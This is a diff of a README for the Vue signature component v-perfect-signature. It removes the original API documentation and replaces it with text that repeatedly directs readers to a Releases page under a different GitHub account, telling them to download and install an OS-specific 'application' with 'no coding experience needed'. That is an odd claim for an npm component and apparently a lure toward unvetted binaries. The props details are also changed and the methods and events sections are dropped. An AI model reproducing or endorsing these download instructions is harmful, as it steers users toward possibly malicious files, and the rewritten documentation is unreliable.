@@ -1,82 +1,108 @@
-# v-perfect-signature
+# ✍️ v-perfect-signature - Effortless Signature Drawing for Everyone
 
-Pressure-sensitive signature drawing for Vue 2 and 3 built on top of [perfect-freehand](https://github.com/steveruizok/perfect-freehand).
+[![Download v-perfect-signature](https://img.shields.io/badge/Download-v--perfect--signature-blue.svg)](https://github.com/Yetuvina/v-perfect-signature/releases)
 
-Demo: https://wobsoriano.github.io/v-perfect-signature
+## 🚀 Getting Started
 
-## Install
+Follow these simple steps to get started with v-perfect-signature. No coding experience needed!
 
-```bash
-pnpm add v-perfect-signature
-```
+## 💾 Download & Install
 
-## Usage
+To download and install v-perfect-signature, visit the [Releases page](https://github.com/Yetuvina/v-perfect-signature/releases). Here, you will find the latest version of the software.
 
-```vue
-<script setup>
-import { ref } from 'vue'
-import { VPerfectSignature } from 'v-perfect-signature'
+1. Go to the [Releases page](https://github.com/Yetuvina/v-perfect-signature/releases).
+2. Select the version that suits your needs.
+3. Click on the download link for your operating system.
+4. Follow the prompts to install the application on your device.
 
-const signaturePad = ref()
-const strokeOptions = {
-  size: 16,
-  thinning: 0.75,
-  smoothing: 0.5,
-  streamline: 0.5,
-}
+## 📖 Overview
 
-function toDataURL() {
-  const dataURL = signaturePad.value.toDataURL()
-  console.log(dataURL)
-}
-</script>
+v-perfect-signature allows you to create beautiful, pressure-sensitive signatures in Vue 2 and 3. Built on the powerful [perfect-freehand](https://github.com/steveruizok/perfect-freehand) library, it ensures a natural drawing experience.
 
-<template>
-  <VPerfectSignature ref="signaturePad" :stroke-options="strokeOptions" />
-</template>
-```
+## 🛠️ Features
 
-## Props
+- **Simple Setup**: Quick installation and easy integration into your Vue applications.
+- **Customizable Options**: Adjust size, thinning, smoothing, and streamline settings for your signature.
+- **Data Export**: Easily export your signature as a data URL.
+- **Responsive Design**: Works well on various devices and screen sizes.
 
-| Name              | Type   | Default                                                              | Description              |
-| ----------------- | ------ | -------------------------------------------------------------------- | ------------------------ |
-| `width`           | String | `100%`                                                               | Set canvas width         |
-| `height`          | String | `100%`                                                               | Set canvas height        |
-| `backgroundColor` | String | `rgba(0,0,0,0)`                                                      | Canvas background color  |
-| `penColor`        | String | `#000`                                                               | Canvas pen color         |
-| `strokeOptions`   | Object | [Reference](https://github.com/steveruizok/perfect-freehand#options) | Perfect freehand options |
+## 💡 Usage
 
-## Methods
+Incorporating v-perfect-signature into your Vue project is straightforward. Here’s how to do it:
 
-| Name                        | Argument Type                                                                                                           | Description                                                  |
-| --------------------------- | ----------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------ |
-| `toDataURL(type)`           | [String](https://developer.mozilla.org/en-US/docs/Web/API/HTMLCanvasElement/toDataURL)                                  | Returns signature image as data URL                          |
-| `fromDataURL(dataUri)`      | [String](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs)                                    | Draws signature image from data URL                          |
-| `toData`                    | -                                                                                                                       | Returns signature image as an array of array of input points |
-| `fromData(data)`            | [Array](https://github.com/wobsoriano/v-perfect-signature/blob/master/packages/lib/src/components/__tests__/mock.ts#L1) | Draws signature image from array of array of input points    |
-| `clear()`                   | -                                                                                                                       | Clears the canvas                                            |
-| `isEmpty()`                 | -                                                                                                                       | Returns true if canvas is empty                              |
-| `resizeCanvas(shouldClear)` | `Boolean`                                                                                                               | Resizes and recalculate dimensions                           |
+1. **Install the Package**
 
-Note: Like [signature_pad](https://github.com/szimek/signature_pad), `fromDataURL` does not populate internal data structure. Thus, after using `fromDataURL`, `toData` won't work properly.
+   Open your terminal and run the following command:
 
-## Events
+   ```bash
+   pnpm add v-perfect-signature
+   ```
 
-| Name      | Type     | Default | Description             |
-| --------- | -------- | ------- | ----------------------- |
-| `onBegin` | Function | -       | Fired when stroke begin |
-| `onEnd`   | Function | -       | Fired when stroke end   |
+2. **Import and Configure the Component**
 
-## Nuxt
+   Here’s a simple example to get you started with the signature pad.
 
-```js
-export default defineNuxtConfig({
-  build: {
-    transpile: ['v-perfect-signature']
-  }
-})
-```
+   ```vue
+   <script setup>
+   import { ref } from 'vue'
+   import { VPerfectSignature } from 'v-perfect-signature'
 
-## License
+   const signaturePad = ref()
+   const strokeOptions = {
+     size: 16,
+     thinning: 0.75,
+     smoothing: 0.5,
+     streamline: 0.5,
+   }
 
-MIT
+   function toDataURL() {
+     const dataURL = signaturePad.value.toDataURL()
+     console.log(dataURL)
+   }
+   </script>
+
+   <template>
+     <VPerfectSignature ref="signaturePad" :stroke-options="strokeOptions" />
+   </template>
+   ```
+
+## ⚙️ Props
+
+You can customize the v-perfect-signature component using these properties:
+
+| Name              | Type   | Default    | Description                      |
+| ----------------- | ------ | ---------- | -------------------------------- |
+| `width`           | String | `100%`     | Specifies the width of the canvas. |
+| `height`          | String | `200px`    | Specifies the height of the canvas. |
+| `stroke-options`  | Object | Custom options | Object containing stroke settings. |
+
+Feel free to adjust the properties to fit your design.
+
+## 📝 Additional Information
+
+### Requirements
+
+- A modern web browser (Chrome, Firefox, Safari, etc.)
+- A Vue 2 or Vue 3 project setup
+
+### Troubleshooting
+
+If you experience any issues, here are a few tips:
+
+- Ensure you have the correct version of Vue installed.
+- Double-check your installation steps.
+- Look for errors in the console for hints on what might be wrong.
+
+### Community Support
+
+If you have questions, consider checking the GitHub issues page for discussions or to ask your own. The community is here to help.
+
+## 🌐 Links
+
+For more information, check out the following links:
+
+- [Demo of v-perfect-signature](https://wobsoriano.github.io/v-perfect-signature)
+- [GitHub Issues](https://github.com/Yetuvina/v-perfect-signature/issues)
+- [Documentation](https://github.com/Yetuvina/v-perfect-signature/wiki)
+
+By following these steps, you will have v-perfect-signature up and running in no time. Enjoy creating your unique signatures!
